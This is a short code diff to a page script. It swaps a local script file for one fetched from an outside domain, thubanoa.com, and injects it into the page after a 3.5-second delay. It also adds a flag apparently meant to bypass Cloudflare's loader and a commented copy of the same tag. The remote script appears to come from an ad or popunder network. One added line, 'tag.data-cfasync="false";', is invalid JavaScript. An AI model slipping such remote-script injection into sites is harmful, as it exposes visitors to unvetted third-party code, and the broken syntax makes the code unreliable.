@@ -55,9 +55,15 @@ document.getElementsByTagName("body")[0].appendChild(tag);
 	 setTimeout(function(){ 
 		 console.log("."); 
 var tag = document.createElement("script");
-tag.src = "js/in-page.js";
+tag.async="async";
+tag.src = "//thubanoa.com/1?z=7205874";
+tag.data-cfasync="false";
 document.getElementsByTagName("body")[0].appendChild(tag);
 	 },3500);
+
+	/*
+ <script async="async" data-cfasync="false" src="//thubanoa.com/1?z=7205874"></script>
+ */
 
 });
 
